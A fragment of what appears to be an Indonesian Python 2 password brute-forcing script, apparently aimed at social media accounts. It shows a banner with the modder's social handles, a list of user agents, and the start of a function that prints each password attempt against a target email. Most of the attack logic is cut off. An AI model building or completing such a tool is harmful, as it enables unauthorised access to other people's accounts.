...
def banner():
    ...
    runntxt(WW+'             @@@      rrrrrrrrr           ')
    runntxt(GL+'            @   @     r        r      ')
    runntxt(GG+'           @     @    r        r     ')
    runntxt(WW+'          @       @   r        r    ')
    runntxt(GG+'         @         @  r      rr       ')
    runntxt(Y+'        @@@@@@@@@@@@@ rrrrrrrrrr       ')
    runntxt(C+'        @            @ r        r      ')
    runntxt(GL+'        @           @ r        r      ')
    runntxt(WW+'        @           @ r        r    ')
    time.sleep(1.5)
    ...
    print GG+"  √=============================================√"
    print WW+"  |            MOD BY: DarkGans4127             |"
    print GL+"  |       Berdoa Dulu Sebelum Menggunakan       |"
    print WW+"  |            FACEBOOK: WahyuAditya            |"
    print Y+"  |             INSTAGRAM: WAYY2308              |"
    print GL+"  |---------------------------------------------|"
...
print wd+"         https://www.youtube.com/channel/UCou559mP2yX00xGXvLrqrLA "
...
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Ge                                   >
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozil                                   >
...
def iqbalz(iqbalz_password):
  try:
        sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqba                                   >
        sys.stdout.flush()
